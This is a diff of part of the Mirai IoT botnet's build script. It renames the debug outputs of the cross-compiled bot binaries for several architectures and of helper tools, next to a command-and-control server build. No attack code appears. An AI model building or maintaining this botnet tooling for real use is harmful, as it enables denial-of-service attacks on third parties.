@@ -57,15 +57,15 @@ elif [ "$1" == "debug" ]; then
     rm -rf debug
     mkdir -p debug
 
-    i586-gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
-    mips-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.mips
-    armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm
-#   armv6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm7
-    sh4-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.sh4
+    i586-gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.x86.dbg
+    mips-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.mips.dbg
+    armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm.dbg
+#   armv6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm7.dbg
+    sh4-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.sh4.dbg
 
-    gcc -std=c99 tools/enc.c -g -o debug/enc
-    gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
-    gcc -std=c99 tools/badbot.c -g -o debug/badbot
+    gcc -std=c99 tools/enc.c -g -o debug/enc.dbg
+    gcc -std=c99 tools/nogdb.c -g -o debug/nogdb.dbg
+    gcc -std=c99 tools/badbot.c -g -o debug/badbot.dbg
 
     echo ">> Building cnc..."
     go build -o debug/cnc cnc/*.go
